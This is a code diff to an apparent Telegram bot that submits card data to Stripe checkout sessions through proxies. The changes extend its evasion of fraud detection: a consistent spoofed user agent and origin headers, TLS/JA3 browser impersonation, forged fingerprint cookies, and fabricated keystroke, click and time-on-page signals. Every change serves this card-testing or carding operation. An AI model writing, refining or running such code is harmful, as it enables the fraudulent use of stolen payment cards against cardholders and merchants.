@@ -232,14 +232,25 @@ def _detect_browser_info(ua: str) -> dict:
     
     return info
 
-def get_headers(stripe_js: bool = False) -> dict:
-    """Return headers mimicking Stripe.js browser requests."""
-    ua = random.choice(USER_AGENTS)
+def get_headers(stripe_js: bool = False, user_agent: str = None, stripe_origin: str = None) -> dict:
+    """Return headers mimicking Stripe.js browser requests.
+    user_agent: pass a fixed UA for session consistency (init + confirm same UA).
+    stripe_origin: 'buy' or 'checkout' to set correct origin/referer."""
+    ua = user_agent or random.choice(USER_AGENTS)
+    
+    # Dynamic origin/referer based on URL type
+    if stripe_origin == "buy":
+        origin = "https://buy.stripe.com"
+        referer = "https://buy.stripe.com/"
+    else:
+        origin = "https://checkout.stripe.com"
+        referer = "https://checkout.stripe.com/"
+    
     headers = {
         "accept": "application/json",
         "content-type": "application/x-www-form-urlencoded",
-        "origin": "https://checkout.stripe.com",
-        "referer": "https://checkout.stripe.com/",
+        "origin": origin,
+        "referer": referer,
         "user-agent": ua
     }
     if stripe_js:
@@ -247,14 +258,11 @@ def get_headers(stripe_js: bool = False) -> dict:
         v = browser["version"]
         platform = browser["platform"]
         
+        # Locale consistency — always en-US primary (matches browser_locale=en-US)
         headers["accept-language"] = random.choice([
             "en-US,en;q=0.9",
-            "en-US,en;q=0.9,id;q=0.8",
-            "en-GB,en;q=0.9,en-US;q=0.8",
-            "en-US,en;q=0.9,nl;q=0.8",
-            "en-US,en;q=0.9,de;q=0.8",
-            "en-US,en;q=0.9,fr;q=0.8",
-            "en-US,en;q=0.9,ja;q=0.8",
+            "en-US,en;q=0.9,en-GB;q=0.8",
+            "en-US,en;q=0.9,es;q=0.8",
         ])
         headers["sec-fetch-dest"] = "empty"
         headers["sec-fetch-mode"] = "cors"
@@ -797,8 +805,15 @@ def is_bin_input(text: str) -> bool:
     cleaned = re.sub(r'\D', '', text.strip())
     return 6 <= len(cleaned) <= 12
 
-async def get_checkout_info(url: str) -> dict:
+async def get_checkout_info(url: str, user_id: int = None, proxy_str: str = None) -> dict:
     start = time.perf_counter()
+    
+    # Determine stripe origin from URL type
+    stripe_origin = "buy" if "buy.stripe.com" in url else "checkout"
+    
+    # Pick a consistent UA for the entire session (init + confirm will share this)
+    session_ua = random.choice(USER_AGENTS)
+    
     result = {
         "url": url,
         "pk": None,
@@ -818,7 +833,10 @@ async def get_checkout_info(url: str) -> dict:
         "cancel_url": None,
         "init_data": None,
         "error": None,
-        "time": 0
+        "time": 0,
+        # Session consistency fields — reused by charge_card
+        "session_ua": session_ua,
+        "stripe_origin": stripe_origin,
     }
     
     try:
@@ -827,16 +845,39 @@ async def get_checkout_info(url: str) -> dict:
         result["cs"] = decoded.get("cs")
         
         if result["pk"] and result["cs"]:
-            s = await get_session()
+            # Generate fingerprints early so init and confirm share the same muid
+            fp = generate_stripe_fingerprints(user_id)
             _init_eid = generate_eid()
             body = f"key={result['pk']}&eid={_init_eid}&browser_locale=en-US&redirect_type=url"
             
-            async with s.post(
-                f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init",
-                headers=get_headers(),
-                data=body
-            ) as r:
-                init_data = await r.json()
+            # Headers with consistent UA + stripe cookies (same as confirm will use)
+            headers = get_headers(stripe_js=True, user_agent=session_ua, stripe_origin=stripe_origin)
+            headers["Cookie"] = get_stripe_cookies(fp)
+            
+            init_url = f"https://api.stripe.com/v1/payment_pages/{result['cs']}/init"
+            proxy_url = get_proxy_url(proxy_str) if proxy_str else None
+            
+            # Use curl_cffi for TLS/JA3 consistency with confirm request
+            if HAS_CURL_CFFI:
+                try:
+                    async with CurlAsyncSession(impersonate="chrome131") as curl_s:
+                        resp = await curl_s.post(
+                            init_url,
+                            headers=headers,
+                            data=body,
+                            proxy=proxy_url,
+                            timeout=20,
+                        )
+                        init_data = resp.json()
+                except Exception as curl_err:
+                    print(f"[DEBUG] curl_cffi init failed, fallback: {str(curl_err)[:40]}")
+                    s = await get_session()
+                    async with s.post(init_url, headers=headers, data=body) as r:
+                        init_data = await r.json()
+            else:
+                s = await get_session()
+                async with s.post(init_url, headers=headers, data=body) as r:
+                    init_data = await r.json()
             
             if "error" not in init_data:
                 result["init_data"] = init_data
@@ -971,10 +1012,21 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
             time_on_page = random.randint(8000, 90000)  # 8-90 seconds (realistic range)
             eid = generate_eid()
             
+            # Behavioral signals — simulate real user typing + clicking
+            key_down_count = random.randint(15, 45)   # keystrokes while filling form
+            mouse_click_count = random.randint(3, 12)  # clicks on form fields
+            
             # Randomize pasted_fields (real users sometimes paste, sometimes type)
             pasted = random.choice(["number", "number", "number", ""])
+            # If pasted, fewer keystrokes (user only typed CVV + maybe name)
+            if pasted:
+                key_down_count = random.randint(6, 20)
             
             print(f"[DEBUG] Stripe.js Emulation: Confirming with fingerprints + TLS impersonation...")
+            
+            # Retrieve session-consistent UA + origin from checkout_data
+            session_ua = checkout_data.get("session_ua")
+            stripe_origin = checkout_data.get("stripe_origin", "checkout")
             
             # Build confirm body — Stripe.js style with full card data + fingerprints
             conf_body = (
@@ -996,6 +1048,8 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 f"&payment_method_data[sid]={fp['sid']}"
                 f"&payment_method_data[payment_user_agent]={get_random_stripe_js_agent()}"
                 f"&payment_method_data[time_on_page]={time_on_page}"
+                f"&payment_method_data[key_down_count]={key_down_count}"
+                f"&payment_method_data[mouse_click_count]={mouse_click_count}"
             )
             if pasted:
                 conf_body += f"&payment_method_data[pasted_fields]={pasted}"
@@ -1008,11 +1062,12 @@ async def charge_card(card: dict, checkout_data: dict, proxy_str: str = None, us
                 f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                 f"&expected_payment_method_type=card"
                 f"&key={pk}"
+                f"&_stripe_version=2025-01-27.acacia"
                 f"&init_checksum={checksum}"
             )
             
-            # Headers with Stripe cookies (mimics real browser)
-            headers = get_headers(stripe_js=True)
+            # Headers with consistent session UA + Stripe cookies
+            headers = get_headers(stripe_js=True, user_agent=session_ua, stripe_origin=stripe_origin)
             headers["Cookie"] = get_stripe_cookies(fp)
             
             # Use curl_cffi for TLS/JA3 fingerprint impersonation if available
@@ -1533,7 +1588,9 @@ async def co_handler(msg: Message):
         parse_mode=ParseMode.HTML
     )
     
-    checkout_data = await get_checkout_info(url)
+    # Get proxy for init request (same proxy will be used for confirm)
+    init_proxy = get_user_proxy(user_id) if user_proxies else None
+    checkout_data = await get_checkout_info(url, user_id=user_id, proxy_str=init_proxy)
     
     if checkout_data.get("error"):
         await processing_msg.edit_text(
